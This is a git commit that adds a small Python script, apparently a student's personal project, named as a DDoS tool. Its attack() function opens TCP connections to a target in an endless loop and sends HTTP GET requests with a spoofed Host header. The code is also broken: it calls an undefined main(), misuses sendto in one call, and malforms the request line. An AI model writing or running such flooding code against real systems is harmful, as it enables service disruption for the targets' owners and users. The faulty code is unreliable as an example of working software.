dc0823412b22e3d5ec20d850fff7ccd4ed3e3d1b
Luis Gonzalez <lg222zm@student.lnu.se>
2023-01-09 18:37:45 +0100

    Starting some personal projects

---
+++ Project/ddos_script/main.py
@@ -0,0 +1,20 @@
+import socket
+import threading
+
+
+# target = '10.0.0.138'
+# fake_ip = '182.21.20.32'
+# port = 80
+
+def attack(target: str, fake_ip: str, port: int):
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
+        s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), target, port)
+        s.close()
+
+
+
+if __name__ == "__main__":
+    main()
